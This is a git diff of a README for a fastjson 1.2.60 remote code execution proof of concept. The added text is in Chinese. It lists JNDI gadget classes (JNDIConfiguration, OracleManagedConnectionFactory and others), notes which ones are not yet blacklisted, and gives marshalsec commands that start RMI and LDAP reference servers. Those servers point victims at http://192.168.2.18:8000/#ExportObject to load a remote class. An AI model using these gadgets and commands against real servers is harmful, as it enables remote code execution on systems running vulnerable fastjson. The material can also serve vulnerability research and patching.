@@ -1,16 +1,27 @@
 # fastjson-1.2.60-rce
-autoType enable
+
+![](./Fastjson-1.2.60-RCE.gif)
 
 
-![](./1.2.60.png)
 
+## Gadgets
+```
+经过测试，命中的4个文件都是可以利用的。
 
-## RMI RefServer
-`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://192.168.2.18:8000/#ExportObject`
+不过其中HikariConfig类就是前文提到的类，在最新版本被加入黑名单，JNDIConnectionPool类在42版本前就被加入黑名单了。
 
-## LDAP RefServer
-`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.2.18:8000/#ExportObject`
+另外的两个类JNDIConfiguration和 OracleManagedConnectionFactory都可以构造出攻击poc，且尚未被加入黑名单。
 
+source/commons-configuration-1.9/org/apache/commons/configuration/JNDIConfiguration.java containsKey
+
+source/commons-configuration-1.9/org/apache/commons/configuration/JNDIConfiguration.java getProperty
+
+source/HikariCP-3.3.1/com/zaxxer/hikari/HikariConfig.java getObjectOrPerformJndiLookup
+
+source/ojdbc14-10.2.0.2/oracle/jdbc/connector/OracleManagedConnectionFactory.java setupXADataSource
+
+source/xalan-2.7.2/org/apache/xalan/lib/sql/JNDIConnectionPool.java findDatasource
+```
 
 ### FastJsonTest.java
 ```
@@ -56,6 +67,13 @@ public class ExportObject {
 }
 
 ```
+
+## RMI RefServer
+`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://192.168.2.18:8000/#ExportObject`
+
+## LDAP RefServer
+`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.2.18:8000/#ExportObject`
+![](./1.2.60.png)
 
 ## 参考链接：
 
